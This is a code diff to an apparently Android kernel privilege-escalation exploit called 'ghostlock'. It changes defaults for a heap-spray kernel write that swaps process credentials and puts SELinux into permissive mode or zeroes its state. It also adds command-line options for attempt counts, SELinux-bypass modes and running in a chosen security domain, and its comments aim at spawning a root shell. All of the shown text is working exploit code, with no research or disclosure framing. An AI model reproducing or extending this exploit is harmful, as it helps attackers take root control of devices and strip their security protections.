@@ -710,7 +710,7 @@ static int do_one_write(uintptr_t target, const char *desc, int mode) {
   TIMER("  heap spray start");
   page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
   if (!page_base) { pr_error("  heap spray failed\n"); clear_pselect_write(); return 0; }
-  if (mode == WRITE_MODE_CRED_SELINUX && env_flag("GHOST_ENFORCE_INIT", 0)) {
+  if (mode == WRITE_MODE_CRED_SELINUX && env_flag("GHOST_ENFORCE_INIT", 1)) {
     /* Verified from the kernel image: selinux_initialized() is
      *   add x8, state, #SELINUX_STATE_INITIALIZED_OFF (2)
      *   ldarb w8, [x8]
@@ -2210,7 +2210,9 @@ static int run_cred_swap(void) {
   uint32_t uid_before = getuid();
   int ghost_exec = env_flag("GHOST_EXEC", 1);
   int ghost_probe = env_flag("GHOST_PROBE", 0); /* post-root DAC/SELinux bisection probes */
-  int attempts = env_int_range("CRED_ATTEMPTS", 3, 1, 6);
+  /* 6 attempts: the GHOST_ENFORCE_INIT parity guard skips pages whose
+   * byte 2 is even (50%), so 6 gives a 63/64 chance of an odd page. */
+  int attempts = env_int_range("CRED_ATTEMPTS", 6, 1, 6);
   for (int att = 1; att <= attempts; att++) {
     pr_info("%s attempt %d/%d\n",
             selinux_mode ? "selinux+cred swap" : "cred swap", att, attempts);
@@ -3205,9 +3207,48 @@ int main(int argc, char **argv) {
      * before execl(), and a SIGPIPE there silently kills the whole process
      * before the root shell can spawn. Ignored dispositions survive exec. */
     signal(SIGPIPE, SIG_IGN);
-    if (argc > 1 && strcmp(argv[1], "--selftest") == 0)
-        return run_selftest();
-    if (argc > 1 && strcmp(argv[1], "--cred") == 0)
-        return run_cred_swap();
+
+    /* Command-line options mirror the environment knobs. setenv() runs before
+     * run_cred_swap()/run_selftest() read them, so the option wins over an
+     * inherited environment value. Defaults: the permissive write preserves
+     * initialized=1 and CRED_ATTEMPTS is 6. */
+    for (int i = 1; i < argc; i++) {
+        const char *a = argv[i];
+        if (!strcmp(a, "--selftest"))
+            return run_selftest();
+        if (!strcmp(a, "--cred"))
+            continue;
+        if (!strcmp(a, "--permissive") || !strcmp(a, "--keep-init")) {
+            setenv("GHOST_SELINUX", "1", 1);
+            setenv("GHOST_ENFORCE_INIT", "1", 1);
+        } else if (!strcmp(a, "--zero-selinux") || !strcmp(a, "--legacy")) {
+            setenv("GHOST_SELINUX", "1", 1);
+            setenv("GHOST_ENFORCE_INIT", "0", 1);
+        } else if (!strcmp(a, "--cred-only") || !strcmp(a, "--no-selinux")) {
+            setenv("GHOST_SELINUX", "0", 1);
+        } else if (!strcmp(a, "--attempts") && i + 1 < argc) {
+            setenv("CRED_ATTEMPTS", argv[++i], 1);
+        } else if (!strcmp(a, "--domain") && i + 1 < argc) {
+            setenv("GHOST_SID_SCAN_CTX", argv[++i], 1);
+            setenv("GHOST_SID_ANY", "1", 1);
+            setenv("GHOST_SID_KEEP", "1", 1);
+            setenv("GHOST_SELINUX", "0", 1);
+        } else if (!strcmp(a, "--help") || !strcmp(a, "-h")) {
+            printf(
+                "usage: ghostlock [--cred] [options]\n"
+                "  --cred           cred swap + SELinux (default)\n"
+                "  --permissive     SELinux permissive, keeps initialized=1 (default)\n"
+                "  --zero-selinux   legacy 8-byte zero write (breaks binder)\n"
+                "  --cred-only      mode 6; SELinux stays enforcing\n"
+                "  --attempts N     reclaim attempts 1..6 (default 6)\n"
+                "  --domain CTX     run in a domain, e.g. u:r:installd:s0\n"
+                "  --selftest       write-primitive self-test\n"
+                "  --help           this text\n");
+            return 0;
+        } else {
+            fprintf(stderr, "unknown option: %s (try --help)\n", a);
+            return 2;
+        }
+    }
     return run_cred_swap();
 }
